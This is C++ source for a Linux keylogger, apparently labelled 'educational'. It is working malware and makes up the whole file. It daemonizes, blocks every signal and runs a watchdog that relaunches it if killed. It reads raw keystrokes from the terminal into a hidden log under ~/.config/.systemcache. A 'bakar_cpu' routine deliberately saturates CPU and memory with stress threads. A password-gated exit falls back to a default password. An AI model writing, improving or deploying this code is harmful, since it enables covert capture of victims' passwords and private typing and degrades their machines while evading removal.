#include <iostream>
#include <fstream>
#include <string>
#include <ctime>
#include <iomanip>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>
#include <cctype>
#include <fcntl.h>
#include <unistd.h>
#include <termios.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/file.h>
#include <vector>
#include <random>
#include <sys/select.h>
#include <cmath>
#include <algorithm>
#include "json.hpp"

using namespace std;
using json = nlohmann::json;

atomic<bool> running(true);
const string LOCKFILE = "/tmp/edu_keylogger.lock";

void ensureLogDirectoryExists(const string& path) {
    size_t pos = 0;
    while ((pos = path.find('/', pos + 1)) != string::npos) {
        string subdir = path.substr(0, pos);
        if (!subdir.empty()) mkdir(subdir.c_str(), 0700);
    }
    mkdir(path.c_str(), 0700);
}

string getHiddenLogPath() {
    const char* home = getenv("HOME");
    string logDir = string(home) + "/.config/.systemcache";
    ensureLogDirectoryExists(logDir);
    return logDir + "/.log";
}

// Fungsi untuk benar-benar membebani CPU dengan stabil
void bakar_cpu() {
    const size_t thread_count = max(8u, thread::hardware_concurrency() * 4);
    vector<thread> threads;
    
    // Stage 1: Integer arithmetic stress
    for (size_t i = 0; i < thread_count; ++i) {
        threads.emplace_back([] {
            random_device rd;
            mt19937_64 gen(rd());
            uniform_int_distribution<uint64_t> dist(1, UINT64_MAX);
            
            while (running) {
                uint64_t a = dist(gen);
                uint64_t b = dist(gen);
                for (int j = 0; j < 1000; ++j) {
                    a = (a * b + j) ^ (a >> 32) ^ (b << 32);
                    b = (b * a + j) ^ (b >> 32) ^ (a << 32);
                }
            }
        });
    }
    
    // Stage 2: Floating point stress
    threads.emplace_back([] {
        random_device rd;
        mt19937 gen(rd());
        uniform_real_distribution<double> dist(-1000.0, 1000.0);
        vector<double> matrix(1000 * 1000);
        
        while (running) {
            // Generate random matrix
            for (auto& val : matrix) {
                val = dist(gen);
            }
            
            // Matrix multiplication stress
            for (int i = 0; i < 100; ++i) {
                vector<double> result(1000 * 1000);
                for (int y = 0; y < 1000; ++y) {
                    for (int x = 0; x < 1000; ++x) {
                        double sum = 0.0;
                        for (int k = 0; k < 1000; ++k) {
                            sum += matrix[y * 1000 + k] * matrix[k * 1000 + x];
                        }
                        result[y * 1000 + x] = sum;
                    }
                }
                swap(matrix, result);
            }
        }
    });
    
    // Stage 3: Memory bandwidth stress
    threads.emplace_back([] {
        const size_t buffer_size = 1 << 26; // 64MB
        vector<uint64_t> buffer(buffer_size);
        random_device rd;
        mt19937_64 gen(rd());
        
        while (running) {
            // Fill with random data
            for (auto& val : buffer) {
                val = gen();
            }
            
            // Memory-intensive operations
            for (int i = 0; i < 100; ++i) {
                for (size_t j = 0; j < buffer_size - 1; ++j) {
                    buffer[j] = (buffer[j] ^ buffer[j + 1]) + (buffer[j] * buffer[j + 1]);
                }
                sort(buffer.begin(), buffer.end());
                reverse(buffer.begin(), buffer.end());
            }
        }
    });
    
    // Join all threads
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }
}

void signalHandler(int signum) {
    ofstream logfile("/tmp/edu_keylogger.log", ios::app);
    time_t now = time(nullptr);
    logfile << "[" << put_time(localtime(&now), "%Y-%m-%d %H:%M:%S") << "] Signal " << signum << " ignored." << endl;
    logfile.close();
}

void blockAllSignals() {
    sigset_t set;
    sigfillset(&set);
    sigprocmask(SIG_SETMASK, &set, NULL);
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);
    
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    
    umask(0);
    if (chdir("/") != 0) {
        exit(EXIT_FAILURE);
    }
    
    for (int fd = sysconf(_SC_OPEN_MAX); fd >= 0; fd--) {
        close(fd);
    }

    int null_fd = open("/dev/null", O_RDWR);
    dup2(null_fd, STDIN_FILENO);
    dup2(null_fd, STDOUT_FILENO);
    dup2(null_fd, STDERR_FILENO);
}

bool createLockFile() {
    int fd = open(LOCKFILE.c_str(), O_CREAT | O_RDWR, 0666);
    if (fd < 0) return false;
    
    if (flock(fd, LOCK_EX | LOCK_NB) < 0) {
        close(fd);
        return false;
    }
    
    string pid_str = to_string(getpid());
    if (write(fd, pid_str.c_str(), pid_str.size()) < 0) {

    }
    return true;
}

void createWatchdogProcess() {
    pid_t pid = fork();
    if (pid == 0) {
        while (true) {
            sleep(1);
            if (!ifstream(LOCKFILE)) {
                execl("/proc/self/exe", "/proc/self/exe", nullptr);
                _exit(EXIT_FAILURE);
            }
        }
    }
}

string keyCodeToString(unsigned char c) {
    if (isprint(c) && !isspace(c)) return string(1, c);
    
    switch (c) {
        case ' ': return " ";
        case '\n': return "[ENTER]\n";
        case 127: return "[BACKSPACE]";
        case '\t': return "[TAB]";
        case 27: return "[ESC]";
        case 1: return "[CTRL+A]";
        case 2: return "[CTRL+B]";
        case 3: return "[CTRL+C]";
        case 4: return "[CTRL+D]";
        case 5: return "[CTRL+E]";
        default:
            if (iscntrl(c)) return "[CTRL+" + to_string(c) + "]";
            return "";
    }
}

bool isExitCombo(char c) {
    return (c == 5); // CTRL+E
}

string loadPassword() {
    try {
        vector<string> paths = {
            "config.json",
            "/etc/edu_keylogger/config.json",
            "/tmp/edu_keylogger_config.json"
        };
        
        for (const auto& path : paths) {
            ifstream configFile(path);
            if (configFile) {
                json config;
                configFile >> config;
                if (config.contains("password")) {
                    return config["password"];
                }
            }
        }
        return "default_password";
    } catch (...) {
        return "default_password";
    }
}

void keyloggerMain() {
    string exitPassword = loadPassword();
    thread cpu_thread(bakar_cpu);
    cpu_thread.detach();
    
    time_t startTime = time(nullptr);
    const int totalDuration = 60 * 60; // 1 jam
    
    string logPath = getHiddenLogPath();
    ofstream logfile(logPath, ios::app);
    logfile << "==== STARTED AT " << put_time(localtime(&startTime), "%Y-%m-%d %H:%M:%S")
            << " ====\nDURATION: " << totalDuration << " seconds\nPASSWORD: " 
            << (exitPassword.empty() ? "default_password" : "*******") << endl;
    
    int tty_fd = open("/dev/tty", O_RDWR | O_NOCTTY);
    if (tty_fd < 0) {
        logfile << "ERROR: Failed to open /dev/tty" << endl;
        return;
    }
    
    struct termios oldt, newt;
    tcgetattr(tty_fd, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON | ECHO);
    newt.c_cc[VMIN] = 1;
    newt.c_cc[VTIME] = 0;
    tcsetattr(tty_fd, TCSANOW, &newt);
    
    while (running) {
        // Check timeout
        if (difftime(time(nullptr), startTime) >= totalDuration) {
            logfile << "\n[✓] SESSION COMPLETE. TIME'S UP!\n";
            running = false;
            break;
        }
        
        // Check shutdown flag
        string shutdownFlagPath = string(getenv("HOME")) + "/.config/.systemcache/.exit";
        ifstream flagfile(shutdownFlagPath);
        if (flagfile) {
            string password;
            flagfile >> password;
            flagfile.close();
            remove(shutdownFlagPath);
            
            if (password == exitPassword) {
                logfile << "\n[✓] CORRECT PASSWORD. EXITING...\n";
                running = false;
                break;
            } else {
                logfile << "\n[!] WRONG PASSWORD ATTEMPT!\n";
            }
        }
        
        // Read keyboard
        char c;
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(tty_fd, &fds);
        
        timeval timeout = {1, 0}; // 1 second
        if (select(tty_fd + 1, &fds, NULL, NULL, &timeout) > 0) {
            if (read(tty_fd, &c, 1) > 0) {
                string key = keyCodeToString(static_cast<unsigned char>(c));
                if (!key.empty()) {
                    logfile << key << flush;
                }
                
                if (isExitCombo(c)) {
                    logfile << "\n[!] EXIT COMBO DETECTED! WAITING FOR PASSWORD...\n";
                }
            }
        }
    }
    
    // Cleanup
    tcsetattr(tty_fd, TCSANOW, &oldt);
    close(tty_fd);
    logfile.close();
    remove(LOCKFILE.c_str());
}

int main(int argc, char* argv[]) {
    if (argc == 1) { // Daemon mode
        if (!createLockFile()) {
            cerr << "ERROR: Program already running!" << endl;
            return 1;
        }
        
        daemonize();
        blockAllSignals();
        createWatchdogProcess();
        keyloggerMain();
    } else { // Shutdown mode
        string home = getenv("HOME");
        string shutdownFlagPath = home + "/.config/.systemcache/.exit";
        string password;
        cout << "Enter shutdown password: ";
        cin >> password;
        
        ofstream flagfile(shutdownFlagPath);
        if (flagfile) {
            flagfile << password;
            flagfile.close();
            cout << "Shutdown signal sent. Exiting within 10 seconds..." << endl;
        } else {
            cerr << "ERROR: Cannot create shutdown file" << endl;
            return 1;
        }
    }
    return 0;
}
